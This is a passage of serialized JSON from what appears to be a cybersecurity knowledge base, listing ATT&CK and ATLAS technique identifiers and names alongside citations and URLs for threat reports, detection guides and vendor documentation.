Persistence","T1564","T1562","T1053","T1552","T1078","T1584","T1590","T1070","T1036","T1588","T1137","T1021","T1553","AML.T0002","AML.T0043","T1134","https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf","Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.","Mandiant APT1","T1037","Mandiant M-Trends 2020","https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020","Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.","Cisco Synful Knock Evolution","https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices","Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.","T1555","Cisco DoSdetectNetflow","https:\u002F\u002Fwww.cisco.com\u002Fc\u002Fen\u002Fus\u002Ftd\u002Fdocs\u002Fios-xml\u002Fios\u002Fnetflow\u002Fconfiguration\u002F15-mt\u002Fnf-15-mt-book\u002Fnf-detct-analy-thrts.pdf","Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.","ATT ScanBox","https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks","Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.","DNS Dumpster","https:\u002F\u002Fdnsdumpster.com\u002F","Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.","T1027","T1542","T1596","T1608",null,"AML.T0002.000","AML.T0040","T1548","T1087","T1098","T1071","T1110","T1543","T1587","T1499","T1592","WHOIS","Circl Passive DNS","https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F","CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.","T1591","T1056","T1556","T1578","Microsoft Anti Spoofing","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fmicrosoft-365\u002Fsecurity\u002Foffice-365-security\u002Fanti-spoofing-protection?view=o365-worldwide","Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.","ACSC Email Spoofing","https:\u002F\u002Fwww.cyber.gov.au\u002Fsites\u002Fdefault\u002Ffiles\u002F2019-03\u002Fspoof_email_sender_policy_framework.pdf","Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.","T1090","T1558","T1550","2020-01-01","AML.T0010","AML.T0005","T1560","https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F","Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.","Sofacy Komplex Trojan","US-CERT TA18-068A 2018","https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-086A","US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.","T1136","Talos Olympic Destroyer 2018","https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html","Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.","T1565","T1001","T1213","T1568","T1114","T1585","T1048","CAPEC-555","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F555.html","T1589","https:\u002F\u002Fwww.whois.net\u002F","NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.","ThreatPost Broadvoice Leak","https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F","Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn487457.aspx","Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.","TechNet Audit Policy","https:\u002F\u002Fgithub.com\u002Fmattifestation\u002FPowerSploit","PowerSploit. (n.d.). Retrieved December 4, 2014.","Powersploit","T1069","T1566","T1598","T1505","T1195","T1204","T1497","T1102","AML.T0043.000","AML.T0024","https:\u002F\u002Fwww.welivesecurity.com\u002F2016\u002F07\u002F06\u002Fnew-osxkeydnap-malware-hungry-credentials\u002F","Marc-Etienne M.Leveille. (2016, July 6). New OSX\u002FKeydnap malware is hungry for credentials. Retrieved July 3, 2017.","OSX Keydnap malware","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fwindows-server-docs\u002Fidentity\u002Fad-ds\u002Fmanage\u002Fcomponent-updates\u002Fcommand-line-process-auditing","Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.","Microsoft Command-line Logging","Elastic - Koadiac Detection with EQL","https:\u002F\u002Fwww.elastic.co\u002Fblog\u002Fembracing-offensive-tooling-building-detections-against-koadic-using-eql","Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.","https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F","Expel IO Evil in AWS","https:\u002F\u002Fexpel.io\u002Fblog\u002Ffinding-evil-in-aws\u002F","A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.","T1595","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx","Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.","Microsoft COM","T1586","https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html","Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.","AppleDocs Launch Agent Daemons","https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F01\u002Fnew-mac-backdoor-using-antiquated-code\u002F","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.","Antiquated Mac Malware","T1132","DOJ Lazarus Sony 2018","https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpress-release\u002Ffile\u002F1092091\u002Fdownload","Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.","T1074","T1602","T1491","T1561","https:\u002F\u002Fdocs.microsoft.com\u002Fsysinternals\u002Fdownloads\u002Fsysmon","Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.","Microsoft Sysmon v6 May 2017","T1484","T1573","Arbor AnnualDoSreport Jan 2018","https:\u002F\u002Fpages.arbornetworks.com\u002Frs\u002F082-KNA-087\u002Fimages\u002F13th_Worldwide_Infrastructure_Security_Report.pdf","Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.","T1567","https:\u002F\u002Fadsecurity.org\u002F?p=1515","Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.","ADSecurity Detecting Forged Tickets","T1222","T1606","Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.","https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html","Pass The Cookie","Unit 42 Mac Crypto Cookies January 2019","https:\u002F\u002Funit42.paloaltonetworks.com\u002Fmac-malware-steals-cryptocurrency-exchanges-cookies\u002F","Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.","http:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fin-depth-look-apt-attack-tools-of-the-trade\u002F","Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.","Trend Micro APT Attack Tools","T1559","T1557","Cisco IOS Software Integrity Assurance - Image File Verification","https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fresources\u002Fintegrity_assurance.html#7","Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.","Cisco IOS Software Integrity Assurance - Run-Time Memory Verification","https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fresources\u002Fintegrity_assurance.html#13","Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.","T1601","T1498","French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.","https:\u002F\u002Fmedium.com\u002Fthreatpunter\u002Fdetecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Medium Detecting Attempts to Steal Passwords from Memory","Microsoft Detect Outlook Forms","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Fsecuritycompliance\u002Fdetect-and-remediate-outlook-rules-forms-attack","Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.","SensePost NotRuler","https:\u002F\u002Fgithub.com\u002Fsensepost\u002Fnotruler","SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.","T1563","T1597","T1593","T1569","T1600","AML.T0002.001","AML.T0016","AML.T0017",{},"AML.T0020","AML.T0010.002","AML.T0047",{},{},"AML.T0042","AML.T0043.001","AML.T0043.002","AML.T0043.003","https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F04\u002Fnew-osx-dok-malware-intercepts-web-traffic\u002F","Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.","OSX.Dok Malware","Microsoft TechNet. (n.d.). Retrieved April 25, 2017.","Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fcli\u002Fazure\u002Fad\u002Fuser?view=azure-cli-latest","Microsoft AZ CLI","Microsoft SolarWinds Customer Guidance","MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 17, 2020.","https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FList_of_file_signatures","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.","Wikipedia File Header Signatures","T1020","US-CERT-TA18-106A","https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-106A","US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.","FireEye CFR Watering Hole 2012","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F12\u002Fcouncil-foreign-relations-water-hole-attack-details.html","Kindlund, D. (2012, December 30). CFR Watering Hole Attack Details. Retrieved December 18, 2020.","http:\u002F\u002Fdocplayer.net\u002F20839173-Analysis-of-malicious-security-support-provider-dlls.html","Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.","Graeber 2014","Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.","Malware Persistence on OS X","Startup Items","Fireeye Hunting COM June 2019","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html","Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.","https:\u002F\u002Fenigma0x3.net\u002F2017\u002F11\u002F16\u002Flateral-movement-using-outlooks-createobject-method-and-dotnettojscript\u002F","Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.","Enigma Outlook DCOM Lateral Movement Nov 2017","https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F05\u002Flateral-movement-using-the-mmc20-application-com-object\u002F","Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.","Enigma MMC20 COM Jan 2017","AnonHBGary","Bright, P. (2011, February 15). Anonymous speaks: the inside story of the HBGary hack. Retrieved March 9, 2017.","https:\u002F\u002Farstechnica.com\u002Ftech-policy\u002F2011\u002F02\u002Fanonymous-speaks-the-inside-story-of-the-hbgary-hack\u002F","NEWSCASTER2014","Lennon, M. (2014, May 29). Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation. Retrieved March 1, 2017.","https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation","BlackHatRobinSage","Ryan, T. (2010). “Getting In Bed with Robin Sage.”. Retrieved March 6, 2017.","http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf","Kubernetes API","https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Foverview\u002Fkubernetes-api\u002F","The Kubernetes Authors. (n.d.). The Kubernetes API. Retrieved March 29, 2021.","Microsoft User Creation Event","Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Fevent-4720","https:\u002F\u002Fwww.synack.com\u002Fwp-content\u002Fuploads\u002F2016\u002F03\u002FRSA_OSX_Malware.pdf","Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.","OSX Malware Detection","CAPEC-550","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F550.html","CAPEC-551","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F551.html","http:\u002F\u002Fwww.slideshare.net\u002FStephanBorosh\u002Fexternal-to-da-the-os-x-way","Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.","External to DA, the OS X Way","http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F","Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.","Palo Alto Shamoon Nov 2016","https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBinary-to-text_encoding","Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.","Wikipedia Binary-to-text Encoding","https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCharacter_encoding","Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.","Wikipedia Character Encoding","FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.","https:\u002F\u002Fcontent.fireeye.com\u002Fapt\u002Frpt-apt38","FireEye APT38 Oct 2018","Novetta Blockbuster","Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.","https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf","Novetta Blockbuster Destructive Malware","Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.","https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf","https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCode_signing","Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.","Wikipedia Code Signing","Digital Certificates","Splunk Kovar Certificates 2017","https:\u002F\u002Fwww.splunk.com\u002Fen_us\u002Fblog\u002Fsecurity\u002Ftall-tales-of-hunting-with-tls-ssl-certificates.html","Kovar, R. (2017, December 11). Tall Tales of Hunting with TLS\u002FSSL Certificates. Retrieved October 16, 2020.","Sygnia Golden SAML","https:\u002F\u002Fwww.sygnia.co\u002Fgolden-saml-advisory","Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.","https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Fwp-windows-management-instrumentation.pdf","Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.","FireEye WMI 2015","T1480","T1011","T1052","Unit 42 Hildegard Malware","https:\u002F\u002Funit42.paloaltonetworks.com\u002Fhildegard-malware-teamtnt\u002F","Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021.","https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002Fef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100","Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.","Hybrid Analysis Icacls1 June 2018","https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002F22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110","Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.","Hybrid Analysis Icacls2 May 2018","https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FServer_Message_Block","CNET Leaks","https:\u002F\u002Fwww.cnet.com\u002Fnews\u002Fmassive-breach-leaks-773-million-emails-21-million-passwords\u002F","Ng, A. (2019, January 17). Massive breach leaks 773 million email addresses, 21 million passwords. Retrieved October 20, 2020.","CAPEC-13","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F13.html","http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms682425","Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.","Microsoft CreateProcess","CAPEC-552","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F552.html","Elastic Masquerade Ball","Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.","http:\u002F\u002Fpages.endgame.com\u002Frs\u002F627-YBU-612\u002Fimages\u002FEndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf","Twitter ItsReallyNick Masquerading Update","https:\u002F\u002Ftwitter.com\u002FItsReallyNick\u002Fstatus\u002F1055321652777619457","Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.","Cloud Audit Logs","https:\u002F\u002Fcloud.google.com\u002Flogging\u002Fdocs\u002Faudit#admin-activity","Google. (n.d.). Audit Logs. Retrieved June 1, 2020.","T1599","http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fmimikatz-and-dcsync-and-extrasids-oh-my\u002F","https:\u002F\u002Fadsecurity.org\u002F?p=1729","T1588.002","CAPEC-163","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F163.html","https:\u002F\u002Fgithub.com\u002Fryhanson\u002Fphishery","Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.","ArtOfMemoryForensics","https:\u002F\u002Fwww.gnu.org\u002Fsoftware\u002Facct\u002F","GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.","GNU Acct","https:\u002F\u002Faccess.redhat.com\u002Fdocumentation\u002Fen-us\u002Fred_hat_enterprise_linux\u002F6\u002Fhtml\u002Fsecurity_guide\u002Fchap-system_auditing","Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.","RHEL auditd","http:\u002F\u002Fwww.chokepoint.net\u002F2014\u002F02\u002Fdetecting-userland-preload-rootkits.html","stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.","Chokepoint preload rootkits","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fwindowsserver\u002Fee236407.aspx","Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.","TechNet Remote Desktop Services","T1594","T1216","T1518","https:\u002F\u002Fcert.europa.eu\u002Fstatic\u002FWhitePapers\u002FUPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf","Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.","CERT-EU Golden Ticket Protection","https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmotiba\u002F2018\u002F02\u002F23\u002Fdetecting-kerberoasting-activity-using-azure-security-center\u002F","Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.","Microsoft Detecting Kerberoasting Feb 2018","https:\u002F\u002Fadsecurity.org\u002F?p=2293","Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.","AdSecurity Cracking Kerberos Dec 2015","T1016","T1205","T1127","The team first performed reconnaissance to gather information about the target ML model.\n",{},{},{},{},"AML.T0000.001",{},{},{},{},{},{},{},{},{},"AML.T0008",{},{},{},{},{},{},{},{},{},{},{},"AML.T0041",{},{},{},{},{},{},{},"AML.T0013",{},{},{},{},"AML.T0035",{},{},{},"AML.T0006",{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},"AML.T0031",{},{},"AML.T0045",{},"T1548.002",{},"T1548.004",{},"T1548.001",{},"T1548.003",{},"T1134.002",{},"T1134.003",{},"T1134.004",{},"T1134.005",{},"T1134.001","T1531","CAPEC-575","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F575.html",{},"T1087.004","Cloud Account","Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019.","https:\u002F\u002Fgithub.com\u002FTrue-Demon\u002Fraindance","GitHub Raindance","Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019.","https:\u002F\u002Fwww.blackhillsinfosec.com\u002Fred-teaming-microsoft-part-1-active-directory-leaks-via-azure\u002F","Black Hills Red Teaming MS AD Azure, 2018",{},"T1087.002","Domain Account",{},"T1087.003","Google. (n.d.). Retrieved March 16, 2021.",{},"T1087.001","Local Account","https:\u002F\u002Fblog.stealthbits.com\u002Fmanipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.","InsiderThreat ChangeNTLM July 2017",{},"T1098.003","Microsoft Support O365 Add Another Admin, October 2019","https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fadd-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d","Microsoft. (n.d.). Add Another Admin. Retrieved October 18, 2019.","Microsoft O365 Admin Roles","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Fadmin\u002Fadd-users\u002Fabout-admin-roles?view=o365-worldwide","Ako-Adjei, K., Dickhaus, M., Baumgartner, P., Faigel, D., et. al.. (2019, October 8). About admin roles. Retrieved October 18, 2019.",{},"T1098.001",{},"T1098.002",{},"T1098.004","SSH Authorized Keys","TrendmicroHideoutsLease","Max Goncharov. (2015, July 15). Criminal Hideouts for Lease: Bulletproof Hosting Services. Retrieved March 6, 2017.","https:\u002F\u002Fdocuments.trendmicro.com\u002Fassets\u002Fwp\u002Fwp-criminal-hideouts-for-lease.pdf",{},"T1583.005","Botnet","Norton Botnet","https:\u002F\u002Fus.norton.com\u002Finternetsecurity-malware-what-is-a-botnet.html","Norton. (n.d.). What is a botnet?. Retrieved October 4, 2020.","Imperva DDoS for Hire","https:\u002F\u002Fwww.imperva.com\u002Flearn\u002Fddos\u002Fbooters-stressers-ddosers\u002F","Imperva. (n.d.). Booters, Stressers and DDoSers. Retrieved October 4, 2020.",{},"T1583.002","DNS Server",{},"T1583.001","Domains",{},"T1583.004","Server","NYTStuxnet","William J. Broad, John Markoff, and David E. Sanger. (2011, January 15). Israeli Test on Worm Called Crucial in Iran Nuclear Delay. Retrieved March 1, 2017.","https:\u002F\u002Fwww.nytimes.com\u002F2011\u002F01\u002F16\u002Fworld\u002Fmiddleeast\u002F16stuxnet.html",{},"T1583.003","Virtual Private Server",{},"T1583.006","Web Services","Botnet Scan","https:\u002F\u002Fwww.caida.org\u002Fpublications\u002Fpapers\u002F2012\u002Fanalysis_slash_zero\u002Fanalysis_slash_zero.pdf","Dainotti, A. et al. (2012). Analysis of a “\u002F0” Stealth Scan from a Botnet. Retrieved October 20, 2020.",{},"T1595.001",{},"T1595.002",{},"T1071.004","DNS",{},"T1071.002",{},"T1071.003",{},"T1071.001","T1010",{},"T1560.003",{},"T1560.002",{},"T1560.001","T1123","CAPEC-634","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F634.html","T1119",{},"T1020.001","T1197","Elastic - Hunting for Persistence Part 1","https:\u002F\u002Fwww.elastic.co\u002Fblog\u002Fhunting-for-persistence-using-elastic-security-part-1","French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020.","CAPEC-564","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F564.html","http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa376977","Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.","Microsoft Run Key","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa374733.aspx","Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.","MSDN Authentication Packages","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms725475.aspx","Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.","Microsoft TimeProvider","https:\u002F\u002Fblog.cylance.com\u002Fwindows-registry-persistence-part-2-the-run-keys-and-search-order","Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.","Cylance Reg Persistence Sept 2013","Linux Kernel Programming","https:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flkmpg\u002F2.4\u002Flkmpg.pdf","Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",{},"T1547.014",{},"T1547.002","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn408187.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.","Microsoft Configure LSA",{},"T1547.006","https:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fhttp-iframe-injecting-linux-rootkit\u002F","Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.","CrowdStrike Linux Rootkit",{},"T1547.008",{},"T1547.011",{},"T1547.010",{},"T1547.012",{},"T1547.007",{},"T1547.001",{},"T1547.005",{},"T1547.009",{},"T1547.003",{},"T1547.004",{},"T1547.013",{},"T1037.002","https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-malware-persists-on-macos\u002F",{},"T1037.001",{},"T1037.003",{},"T1037.004","intezer-kaiji-malware","https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fresearch\u002Fkaiji-new-chinese-linux-malware-turning-to-golang\u002F","Paul Litvak. (2020, May 4). Kaiji: New Chinese Linux malware turning to Golang. Retrieved December 17, 2020.","https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FStartupItems.html","Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.",{},"T1037.005","T1217","T1176","https:\u002F\u002Fwww.icebrg.io\u002Fblog\u002Fmalicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses","De Tore, M., Warner, J. (2018, January 15). MALICIOUS CHROME EXTENSIONS ENABLE CRIMINALS TO IMPACT OVER HALF A MILLION USERS AND GLOBAL BUSINESSES. Retrieved January 17, 2018.","ICEBRG Chrome Extensions","CAPEC-49","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F49.html",{},"T1110.004",{},"T1110.002",{},"T1110.001","Cylance Cleaver","Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.","https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20200302085133\u002Fhttps:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpages\u002Foperation-cleaver\u002FCylance_Operation_Cleaver_Report.pdf",{},"T1110.003","T1612","Aqua Build 